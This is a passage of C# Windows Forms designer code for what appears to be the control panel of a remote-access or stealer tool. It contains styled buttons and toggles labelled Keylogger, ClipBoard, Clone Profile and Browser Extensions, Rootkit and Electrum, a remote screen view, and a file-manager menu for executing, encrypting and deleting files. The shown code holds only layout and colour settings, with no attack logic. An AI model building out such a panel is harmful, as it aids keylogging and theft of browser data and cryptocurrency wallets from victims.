            bloom7.Name = "Shine2B";
            bloom7.Value = System.Drawing.Color.Transparent;
            bloom8.Name = "Shine3";
            bloom8.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom9.Name = "TextShade";
            bloom9.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom10.Name = "Text";
            bloom10.Value = System.Drawing.Color.White;
            bloom11.Name = "Glow";
            bloom11.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom12.Name = "Border";
            bloom12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom13.Name = "Corners";
            bloom13.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton7.Colors = new BirdBrainmofo.Bloom[] {
        bloom1,
        bloom2,
        bloom3,
        bloom4,
        bloom5,
        bloom6,
        bloom7,
        bloom8,
        bloom9,
        bloom10,
        bloom11,
        bloom12,
        bloom13};
            this.studioButton7.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton7.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton7.Image = null;
            this.studioButton7.Location = new System.Drawing.Point(4, 77);
            this.studioButton7.Name = "studioButton7";
            this.studioButton7.NoRounding = false;
            this.studioButton7.Size = new System.Drawing.Size(94, 25);
            this.studioButton7.TabIndex = 76;
            this.studioButton7.Text = "Browsers";
            this.toolTip1.SetToolTip(this.studioButton7, "      All fuctions");
            this.studioButton7.Transparent = true;
            this.studioButton7.Click += new System.EventHandler(this.studioButton7_Click);
            // 
            // studioButton9
            // 
            this.studioButton9.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton9.BackColor = System.Drawing.Color.Transparent;
            bloom14.Name = "DownGradient1";
            bloom14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom15.Name = "DownGradient2";
            bloom15.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom16.Name = "NoneGradient1";
            bloom16.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom17.Name = "NoneGradient2";
            bloom17.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom18.Name = "Shine1";
            bloom18.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom19.Name = "Shine2A";
            bloom19.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom20.Name = "Shine2B";
            bloom20.Value = System.Drawing.Color.Transparent;
            bloom21.Name = "Shine3";
            bloom21.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom22.Name = "TextShade";
            bloom22.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom23.Name = "Text";
            bloom23.Value = System.Drawing.Color.White;
            bloom24.Name = "Glow";
            bloom24.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom25.Name = "Border";
            bloom25.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom26.Name = "Corners";
            bloom26.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton9.Colors = new BirdBrainmofo.Bloom[] {
        bloom14,
        bloom15,
        bloom16,
        bloom17,
        bloom18,
        bloom19,
        bloom20,
        bloom21,
        bloom22,
        bloom23,
        bloom24,
        bloom25,
        bloom26};
            this.studioButton9.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton9.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton9.Image = null;
            this.studioButton9.Location = new System.Drawing.Point(4, 110);
            this.studioButton9.Name = "studioButton9";
            this.studioButton9.NoRounding = false;
            this.studioButton9.Size = new System.Drawing.Size(94, 25);
            this.studioButton9.TabIndex = 79;
            this.studioButton9.Text = "System";
            this.toolTip1.SetToolTip(this.studioButton9, "      All fuctions");
            this.studioButton9.Transparent = true;
            this.studioButton9.Click += new System.EventHandler(this.studioButton9_Click);
            // 
            // chkClone
            // 
            this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkClone.BackColor = System.Drawing.Color.Transparent;
            this.chkClone.Checked = true;
            this.chkClone.Location = new System.Drawing.Point(26, 578);
            this.chkClone.Name = "chkClone";
            this.chkClone.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClone.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClone.Size = new System.Drawing.Size(50, 19);
            this.chkClone.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkClone.TabIndex = 65;
            this.toolTip1.SetToolTip(this.chkClone, "Clone Profile and Browser Extensions!");
            // 
            // btnRootkit
            // 
            this.btnRootkit.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnRootkit.BackColor = System.Drawing.Color.Transparent;
            bloom27.Name = "DownGradient1";
            bloom27.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom28.Name = "DownGradient2";
            bloom28.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom29.Name = "NoneGradient1";
            bloom29.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom30.Name = "NoneGradient2";
            bloom30.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom31.Name = "Shine1";
            bloom31.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom32.Name = "Shine2A";
            bloom32.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom33.Name = "Shine2B";
            bloom33.Value = System.Drawing.Color.Transparent;
            bloom34.Name = "Shine3";
            bloom34.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom35.Name = "TextShade";
            bloom35.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom36.Name = "Text";
            bloom36.Value = System.Drawing.Color.White;
            bloom37.Name = "Glow";
            bloom37.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom38.Name = "Border";
            bloom38.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom39.Name = "Corners";
            bloom39.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.btnRootkit.Colors = new BirdBrainmofo.Bloom[] {
        bloom27,
        bloom28,
        bloom29,
        bloom30,
        bloom31,
        bloom32,
        bloom33,
        bloom34,
        bloom35,
        bloom36,
        bloom37,
        bloom38,
        bloom39};
            this.btnRootkit.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnRootkit.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnRootkit.Image = null;
            this.btnRootkit.Location = new System.Drawing.Point(4, 44);
            this.btnRootkit.Name = "btnRootkit";
            this.btnRootkit.NoRounding = false;
            this.btnRootkit.Size = new System.Drawing.Size(94, 25);
            this.btnRootkit.TabIndex = 71;
            this.btnRootkit.Text = "Apps";
            this.toolTip1.SetToolTip(this.btnRootkit, "      All fuctions");
            this.btnRootkit.Transparent = true;
            this.btnRootkit.Click += new System.EventHandler(this.btnRootkit_Click);
            // 
            // timer4
            // 
            this.timer4.Tick += new System.EventHandler(this.timer4_Tick);
            // 
            // contextMenuStrip7
            // 
            this.contextMenuStrip7.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem,
            this.stopToolStripMenuItem});
            this.contextMenuStrip7.Name = "contextMenuStrip1";
            this.contextMenuStrip7.Size = new System.Drawing.Size(99, 48);
            // 
            // startToolStripMenuItem
            // 
            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
            this.startToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.startToolStripMenuItem.Text = "Start";
            this.startToolStripMenuItem.Click += new System.EventHandler(this.startToolStripMenuItem_Click);
            // 
            // stopToolStripMenuItem
            // 
            this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
            this.stopToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.stopToolStripMenuItem.Text = "Stop";
            this.stopToolStripMenuItem.Click += new System.EventHandler(this.stopToolStripMenuItem_Click);
            // 
            // timer5
            // 
            this.timer5.Tick += new System.EventHandler(this.timer5_Tick);
            // 
            // timer6
            // 
            this.timer6.Tick += new System.EventHandler(this.timer6_Tick);
            // 
            // timer7
            // 
            this.timer7.Tick += new System.EventHandler(this.timer7_Tick);
            // 
            // timer8
            // 
            this.timer8.Tick += new System.EventHandler(this.timer8_Tick);
            // 
            // timer9
            // 
            this.timer9.Tick += new System.EventHandler(this.timer9_Tick);
            // 
            // FileManagerContextMenuStrip
            // 
            this.FileManagerContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.networkingToolStripMenuItem,
            this.toolStripSeparator3,
            this.executeFileToolStripMenuItem,
            this.createDirectoryToolStripMenuItem,
            this.refreshDirectoryToolStripMenuItem,
            this.toolStripSeparator4,
            this.deleteFolderFileToolStripMenuItem,
            this.cryptographyToolStripMenuItem,
            this.blockFileToolStripMenuItem,
            this.toolStripSeparator5,
            this.searchDirectoryToolStripMenuItem,
            this.searchForFileToolStripMenuItem});
            this.FileManagerContextMenuStrip.Name = "contextMenuStrip1";
            this.FileManagerContextMenuStrip.Size = new System.Drawing.Size(165, 220);
            // 
            // networkingToolStripMenuItem
            // 
            this.networkingToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.downloadFIleToolStripMenuItem,
            this.uploadFileToolStripMenuItem});
            this.networkingToolStripMenuItem.Name = "networkingToolStripMenuItem";
            this.networkingToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.networkingToolStripMenuItem.Text = "Networking";
            // 
            // downloadFIleToolStripMenuItem
            // 
            this.downloadFIleToolStripMenuItem.Name = "downloadFIleToolStripMenuItem";
            this.downloadFIleToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.downloadFIleToolStripMenuItem.Text = "Download File";
            // 
            // uploadFileToolStripMenuItem
            // 
            this.uploadFileToolStripMenuItem.Name = "uploadFileToolStripMenuItem";
            this.uploadFileToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.uploadFileToolStripMenuItem.Text = "Upload File";
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(161, 6);
            // 
            // executeFileToolStripMenuItem
            // 
            this.executeFileToolStripMenuItem.Name = "executeFileToolStripMenuItem";
            this.executeFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.executeFileToolStripMenuItem.Text = "Execute File";
            // 
            // createDirectoryToolStripMenuItem
            // 
            this.createDirectoryToolStripMenuItem.Name = "createDirectoryToolStripMenuItem";
            this.createDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.createDirectoryToolStripMenuItem.Text = "Create Directory";
            // 
            // refreshDirectoryToolStripMenuItem
            // 
            this.refreshDirectoryToolStripMenuItem.Name = "refreshDirectoryToolStripMenuItem";
            this.refreshDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.refreshDirectoryToolStripMenuItem.Text = "Refresh Directory";
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(161, 6);
            // 
            // deleteFolderFileToolStripMenuItem
            // 
            this.deleteFolderFileToolStripMenuItem.Name = "deleteFolderFileToolStripMenuItem";
            this.deleteFolderFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.deleteFolderFileToolStripMenuItem.Text = "Delete Item(s)";
            // 
            // cryptographyToolStripMenuItem
            // 
            this.cryptographyToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.encryptFileToolStripMenuItem,
            this.decryptFileToolStripMenuItem});
            this.cryptographyToolStripMenuItem.Name = "cryptographyToolStripMenuItem";
            this.cryptographyToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.cryptographyToolStripMenuItem.Text = "Cryptography";
            // 
            // encryptFileToolStripMenuItem
            // 
            this.encryptFileToolStripMenuItem.Name = "encryptFileToolStripMenuItem";
            this.encryptFileToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.encryptFileToolStripMenuItem.Text = "Encrypt File";
            // 
            // decryptFileToolStripMenuItem
            // 
            this.decryptFileToolStripMenuItem.Name = "decryptFileToolStripMenuItem";
            this.decryptFileToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.decryptFileToolStripMenuItem.Text = "Decrypt File";
            // 
            // blockFileToolStripMenuItem
            // 
            this.blockFileToolStripMenuItem.Name = "blockFileToolStripMenuItem";
            this.blockFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.blockFileToolStripMenuItem.Text = "Block Item(s)";
            // 
            // toolStripSeparator5
            // 
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new System.Drawing.Size(161, 6);
            // 
            // searchDirectoryToolStripMenuItem
            // 
            this.searchDirectoryToolStripMenuItem.Name = "searchDirectoryToolStripMenuItem";
            this.searchDirectoryToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.searchDirectoryToolStripMenuItem.Text = "Search for Folder";
            // 
            // searchForFileToolStripMenuItem
            // 
            this.searchForFileToolStripMenuItem.Name = "searchForFileToolStripMenuItem";
            this.searchForFileToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.searchForFileToolStripMenuItem.Text = "Search for File";
            // 
            // FileManagerImageList
            // 
            this.FileManagerImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
            this.FileManagerImageList.ImageSize = new System.Drawing.Size(16, 16);
            this.FileManagerImageList.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // timer10
            // 
            this.timer10.Interval = 500000;
            this.timer10.Tick += new System.EventHandler(this.timer10_Tick);
            // 
            // timer11
            // 
            this.timer11.Enabled = true;
            this.timer11.Interval = 2000;
            this.timer11.Tick += new System.EventHandler(this.timer11_Tick);
            // 
            // primeTheme1
            // 
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom40.Name = "Sides";
            bloom40.Value = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(232)))), ((int)(((byte)(232)))));
            bloom41.Name = "Gradient1";
            bloom41.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom42.Name = "Gradient2";
            bloom42.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom43.Name = "TextShade";
            bloom43.Value = System.Drawing.Color.White;
            bloom44.Name = "Text";
            bloom44.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom45.Name = "Back";
            bloom45.Value = System.Drawing.Color.White;
            bloom46.Name = "Border1";
            bloom46.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            bloom47.Name = "Border2";
            bloom47.Value = System.Drawing.Color.White;
            bloom48.Name = "Border3";
            bloom48.Value = System.Drawing.Color.White;
            bloom49.Name = "Border4";
            bloom49.Value = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.primeTheme1.Colors = new BirdBrainmofo.Bloom[] {
        bloom40,
        bloom41,
        bloom42,
        bloom43,
        bloom44,
        bloom45,
        bloom46,
        bloom47,
        bloom48,
        bloom49};
            this.primeTheme1.Controls.Add(this.panel1);
            this.primeTheme1.Controls.Add(this.txtScreen);
            this.primeTheme1.Controls.Add(this.txtFPS);
            this.primeTheme1.Controls.Add(this.studioButton2);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.studioButton4);
            this.primeTheme1.Controls.Add(this.studioButton3);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.ambianceTabControl1);
            this.primeTheme1.Controls.Add(this.button3);
            this.primeTheme1.Controls.Add(this.btnClip);
            this.primeTheme1.Controls.Add(this.studioButton12);
            this.primeTheme1.Controls.Add(this.ShowStart);
            this.primeTheme1.Controls.Add(this.groupBox6);
            this.primeTheme1.Controls.Add(this.btnInfo);
            this.primeTheme1.Controls.Add(this.statusStrip1);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.MinimumSize = new System.Drawing.Size(1208, 729);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(1208, 729);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 32;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.Controls.Add(this.label18);
            this.panel1.Controls.Add(this.chkInfo);
            this.panel1.Controls.Add(this.btnKeyl);
            this.panel1.Controls.Add(this.MinBtn);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.ResizeLabel);
            this.panel1.Controls.Add(this.chkKeylog);
            this.panel1.Controls.Add(this.ResizeScroll);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.chkClip);
            this.panel1.Controls.Add(this.studioButton7);
            this.panel1.Controls.Add(this.studioButton9);
            this.panel1.Controls.Add(this.studioButton11);
            this.panel1.Controls.Add(this.CloseBtn);
            this.panel1.Controls.Add(this.studioButton10);
            this.panel1.Controls.Add(this.RestoreMaxBtn);
            this.panel1.Controls.Add(this.studioButton8);
            this.panel1.Controls.Add(this.studioButton1);
            this.panel1.Controls.Add(this.studioButton6);
            this.panel1.Controls.Add(this.chkClone);
            this.panel1.Controls.Add(this.btnWatcher);
            this.panel1.Controls.Add(this.btnElectrum);
            this.panel1.Controls.Add(this.btnRootkit);
            this.panel1.Location = new System.Drawing.Point(1088, 47);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(102, 648);
            this.panel1.TabIndex = 109;
            // 
            // label18
            // 
            this.label18.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label18.AutoSize = true;
            this.label18.BackColor = System.Drawing.Color.Transparent;
            this.label18.Location = new System.Drawing.Point(14, 414);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(74, 13);
            this.label18.TabIndex = 99;
            this.label18.Text = "Information";
            // 
            // btnKeyl
            // 
            this.btnKeyl.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnKeyl.BackColor = System.Drawing.Color.Transparent;
            bloom50.Name = "DownGradient1";
            bloom50.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom51.Name = "DownGradient2";
            bloom51.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom52.Name = "NoneGradient1";
            bloom52.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom53.Name = "NoneGradient2";
            bloom53.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom54.Name = "Shine1";
            bloom54.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom55.Name = "Shine2A";
            bloom55.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom56.Name = "Shine2B";
            bloom56.Value = System.Drawing.Color.Transparent;
            bloom57.Name = "Shine3";
            bloom57.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom58.Name = "TextShade";
            bloom58.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom59.Name = "Text";
            bloom59.Value = System.Drawing.Color.White;
            bloom60.Name = "Glow";
            bloom60.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom61.Name = "Border";
            bloom61.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom62.Name = "Corners";
            bloom62.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.btnKeyl.Colors = new BirdBrainmofo.Bloom[] {
        bloom50,
        bloom51,
        bloom52,
        bloom53,
        bloom54,
        bloom55,
        bloom56,
        bloom57,
        bloom58,
        bloom59,
        bloom60,
        bloom61,
        bloom62};
            this.btnKeyl.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.btnKeyl.Font = new System.Drawing.Font("Verdana", 8F);
            this.btnKeyl.Image = null;
            this.btnKeyl.Location = new System.Drawing.Point(4, 341);
            this.btnKeyl.Name = "btnKeyl";
            this.btnKeyl.NoRounding = false;
            this.btnKeyl.Size = new System.Drawing.Size(94, 25);
            this.btnKeyl.TabIndex = 87;
            this.btnKeyl.Text = "Keylogger";
            this.btnKeyl.Transparent = true;
            this.btnKeyl.Visible = false;
            this.btnKeyl.Click += new System.EventHandler(this.btnKeyl_Click);
            // 
            // MinBtn
            // 
            this.MinBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.MinBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.MinBtn.Location = new System.Drawing.Point(12, 11);
            this.MinBtn.Name = "MinBtn";
            this.MinBtn.Size = new System.Drawing.Size(26, 26);
            this.MinBtn.TabIndex = 13;
            this.MinBtn.UseVisualStyleBackColor = true;
            this.MinBtn.Click += new System.EventHandler(this.MinBtn_Click);
            // 
            // label2
            // 
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Location = new System.Drawing.Point(19, 455);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(65, 13);
            this.label2.TabIndex = 94;
            this.label2.Text = "Keylogger";
            // 
            // ResizeLabel
            // 
            this.ResizeLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.ResizeLabel.AutoSize = true;
            this.ResizeLabel.Location = new System.Drawing.Point(6, 627);
            this.ResizeLabel.Name = "ResizeLabel";
            this.ResizeLabel.Size = new System.Drawing.Size(90, 13);
            this.ResizeLabel.TabIndex = 4;
            this.ResizeLabel.Text = "Resize : 100%";
            // 
            // ResizeScroll
            // 
            this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.ResizeScroll.AutoSize = false;
            this.ResizeScroll.Location = new System.Drawing.Point(2, 609);
            this.ResizeScroll.Maximum = 100;
            this.ResizeScroll.Minimum = 10;
            this.ResizeScroll.Name = "ResizeScroll";
            this.ResizeScroll.Size = new System.Drawing.Size(98, 19);
            this.ResizeScroll.TabIndex = 10;
            this.ResizeScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.ResizeScroll.Value = 100;
            this.ResizeScroll.Scroll += new System.EventHandler(this.ResizeScroll_Scroll);
            // 
            // label4
            // 
            this.label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Location = new System.Drawing.Point(20, 496);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(63, 13);
            this.label4.TabIndex = 97;
            this.label4.Text = "ClipBoard";
            // 
            // label1
            // 
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Location = new System.Drawing.Point(11, 562);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(80, 13);
            this.label1.TabIndex = 66;
            this.label1.Text = "Clone Profile";
            // 
            // studioButton11
            // 
            this.studioButton11.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton11.BackColor = System.Drawing.Color.Transparent;
            bloom63.Name = "DownGradient1";
            bloom63.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom64.Name = "DownGradient2";
            bloom64.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom65.Name = "NoneGradient1";
            bloom65.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom66.Name = "NoneGradient2";
            bloom66.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom67.Name = "Shine1";
            bloom67.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom68.Name = "Shine2A";
            bloom68.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom69.Name = "Shine2B";
            bloom69.Value = System.Drawing.Color.Transparent;
            bloom70.Name = "Shine3";
            bloom70.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom71.Name = "TextShade";
            bloom71.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom72.Name = "Text";
            bloom72.Value = System.Drawing.Color.White;
            bloom73.Name = "Glow";
            bloom73.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom74.Name = "Border";
            bloom74.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom75.Name = "Corners";
            bloom75.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton11.Colors = new BirdBrainmofo.Bloom[] {
        bloom63,
        bloom64,
        bloom65,
        bloom66,
        bloom67,
        bloom68,
        bloom69,
        bloom70,
        bloom71,
        bloom72,
        bloom73,
        bloom74,
        bloom75};
